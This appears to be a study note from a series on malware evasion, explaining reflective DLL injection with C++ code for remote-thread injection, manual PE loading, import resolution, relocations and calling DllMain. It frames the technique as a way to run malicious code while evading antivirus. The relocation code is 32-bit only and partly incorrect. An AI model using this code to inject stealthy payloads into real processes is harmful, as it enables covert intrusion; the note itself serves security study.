# Index 
- [[7. Advanced Techniques]]
	- [[7.1 Code Reuse (API Unhooking and Windows Code Reuse)]]
	- [[7.2 Syscall Usage (Direct System Calls)]]
	- [[7.3 In-memory Execution (Reflective DLL Injection)]]
	- [[7.4 In-memory Execution of Shellcode (Payload Execution)]]
	- [[7.5 Reflective DLL Injection]]
	- [[7.6 Evading Dynamic Analysis (Anti-VM and Anti-Sandbox Techniques)]]

# Overview of Reflective DLL Injection

Reflective DLL Injection involves several key steps:
1. Allocate Memory in the Target Process: Use `VirtualAllocEx` to reserve memory space in the target process for the DLL.
2. Copy the DLL into the Target Memory: Write the contents of the DLL to the allocated memory using `WriteProcessMemory`.
3. Resolve Imports and Relocations: Once the DLL is loaded into memory, manually resolve its imports and adjust for relocations (similar to what the Windows loader does).
4. Call the DLL Entry Point: Finally, call the `DllMain` function or the entry point of the injected DLL to execute the malicious code.

# Key Components of Reflective DLL Injection

Here are the key components and concepts involved in Reflective DLL Injection:

#### Reflective DLL Structure
   The injected DLL must be built with specific characteristics to be compatible with this technique. It must be self-contained and able to:
   - Locate itself in memory.
   - Parse its own headers (e.g., PE headers) to determine its import table, relocation table, and entry points.
   - Resolve imports and perform relocations dynamically.

#### Memory Allocation
   - Use `VirtualAllocEx` to allocate memory in the target process. This memory should have both read/write/execute permissions (i.e., `PAGE_EXECUTE_READWRITE`).

#### Manually Resolving Imports and Relocations
   Unlike normal DLL loading, where the Windows loader handles resolving imports and relocations, reflective DLL injection requires manually processing the Import Address Table (IAT) and applying relocations.

#### Calling the Entry Point
   - The final step is calling the DLL's entry point, usually `DllMain`, which is the function that will execute the payload.

# Reflective DLL Injection Workflow

Let’s go through each step of the process in detail:

#### Step 1: Inject the DLL into the Target Process

You need to inject the DLL’s binary data into the target process’s memory. First, allocate memory in the target process, then copy the DLL’s content into that memory. Here’s how you can do this in C++:

```cpp
#include <windows.h>
#include <iostream>

BOOL InjectDLL(HANDLE hProcess, const char* dllPath) {
    // Allocate memory in the target process for the DLL path
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);

    if (!pRemoteMemory) {
        std::cerr << "Failed to allocate memory in target process.\n";
        return FALSE;
    }

    // Write the DLL path to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Failed to write to process memory.\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    // Get the address of LoadLibraryA in the target process (in kernel32.dll)
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    if (!pLoadLibrary) {
        std::cerr << "Failed to get the address of LoadLibraryA.\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    // Create a remote thread in the target process to call LoadLibraryA and load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);

    if (!hThread) {
        std::cerr << "Failed to create remote thread.\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Free the allocated memory
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);

    return TRUE;
}
```

This example injects a DLL by writing the path of the DLL into the target process and using `CreateRemoteThread` to load it via `LoadLibraryA`. While this is the basic form of DLL injection, reflective DLL injection doesn’t require a DLL to be on disk and instead loads it directly from memory.

#### Step 2: Reflective DLL Loading in Memory

The reflective loader is responsible for:
- Parsing the PE headers (e.g., DOS header, NT headers).
- Loading sections of the DLL (code, data, etc.) into the appropriate regions of memory.
- Resolving imports and relocations manually.

Let’s break down how a reflective DLL loader works:

1. Parse PE Headers: The reflective loader must parse the DLL's headers (DOS, PE, and optional headers) to understand where the code and data sections are located.

2. Allocate Memory: The loader must allocate memory for the DLL inside the process. This is typically done with `VirtualAlloc`.

3. Load Sections: The DLL has multiple sections (text, data, relocations). The reflective loader manually copies these sections into the allocated memory space.

4. Resolve Imports: The reflective loader must resolve the function addresses that the DLL imports (e.g., kernel32.dll functions like `LoadLibrary`, `GetProcAddress`).

5. Perform Relocations: If the DLL’s preferred base address is not available, the reflective loader must apply relocations to adjust addresses based on where the DLL is actually loaded.

6. Call DllMain: After loading, the loader calls the DLL's entry point (usually `DllMain`) to execute its initialization code.

Here’s a simplified structure of what the reflective DLL loader does:

```cpp
void ReflectiveLoader() {
    // 1. Parse the PE headers to locate the sections
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)YourDllData;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDOSHeader + pDOSHeader->e_lfanew);
    
    // 2. Allocate memory for the DLL in the process
    LPVOID pRemoteImage = VirtualAlloc(NULL, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 3. Copy the sections to the allocated memory
    CopySections(pRemoteImage, pNTHeaders);

    // 4. Resolve imports from the Import Address Table (IAT)
    ResolveImports(pRemoteImage, pNTHeaders);

    // 5. Perform base relocations if necessary
    PerformRelocations(pRemoteImage, pNTHeaders);

    // 6. Call the DLL entry point (DllMain)
    CallDllMain(pRemoteImage, pNTHeaders);
}
```

#### Step 3: Manually Resolving Imports

Every DLL relies on other DLLs (e.g., kernel32.dll) for certain functions. These dependencies are listed in the Import Address Table (IAT). To resolve the imports, the loader needs to:

- Read the Import Directory from the PE headers.
- Loop through each DLL listed in the IAT.
- For each imported function, use `GetProcAddress` to find its address and replace the function pointers in the IAT.

Here’s a simplified example of resolving imports:

```cpp
void ResolveImports(LPVOID pBaseAddress, PIMAGE_NT_HEADERS pNTHeaders) {
    // Get the Import Directory from the PE headers
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pBaseAddress + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Loop through all imported DLLs
    while (pImportDesc->Name) {
        char* szModule = (char*)((BYTE*)pBaseAddress + pImportDesc->Name);
        HMODULE hModule = LoadLibraryA(szModule);

        if (hModule) {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)pBaseAddress + pImportDesc->FirstThunk);

            while (pThunk->u1.AddressOfData) {
                PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pBaseAddress + pThunk->u1.AddressOfData);
                FARPROC pFunction = GetProcAddress(hModule, (char*)pImport->Name);
                pThunk->u1.Function = (DWORD_PTR)pFunction;
                pThunk++;
            }
        }
        pImportDesc++;
    }
}
```

#### Step 4: Performing Base Relocations

If the DLL cannot be loaded at its preferred base address, it needs to be relocated. This is done by applying relocations to adjust absolute addresses in the code.

Relocations are listed in the relocation table. The loader must:
- Parse the relocation table.
- Apply the relocations to adjust memory addresses in the loaded DLL.

Example of applying relocations:

```cpp
void PerformRelocations(LPVOID pBaseAddress, PIMAGE_NT_HEADERS pNTHeaders) {
    DWORD delta = (DWORD_PTR)pBaseAddress - pNTHeaders->OptionalHeader.ImageBase;

    if (delta == 0)
        return; // No relocations needed

    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pBaseAddress + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    while (pReloc->VirtualAddress) {
        WORD* pRelocData = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (int i = 0; i < (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); i++) {
            if (pRelocData[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                DWORD_PTR* pPatchAddr = (DWORD_PTR*)((BYTE*)pBaseAddress + pReloc->VirtualAddress + (pRelocData[i] & 0xFFF));
                *pPatchAddr += delta;
            }
        }

        pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
    }
}
```

#### Step 5: Calling the DLL Entry Point

Once the DLL is loaded, its imports are resolved, and relocations are applied, the final step is to call the entry point, usually `DllMain`.

Example:

```cpp
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

void CallDllMain(LPVOID pBaseAddress, PIMAGE_NT_HEADERS pNTHeaders) {
    DLLMAIN pEntryPoint = (DLLMAIN)((BYTE*)pBaseAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
    pEntryPoint((HINSTANCE)pBaseAddress, DLL_PROCESS_ATTACH, NULL);
}
```

# Reflective DLL Injection in Practice

To use reflective DLL injection in a real-world scenario:
- You typically inject the reflective loader and the DLL into a target process.
- The loader handles all of the work of loading the DLL into memory, resolving imports and relocations, and calling the entry point.

# Practical Applications
Reflective DLL injection is used in many advanced malware and offensive security tools because it avoids writing files to disk, which makes it difficult for AV products to detect. Common use cases include:
- Meterpreter (Metasploit): Uses reflective DLL injection to load its payload into memory.
- Cobalt Strike: Often uses this technique for in-memory execution of beacon payloads.

If you’d like, I can walk you through building a project to test this technique or show specific implementations of any part of the reflective DLL injection process!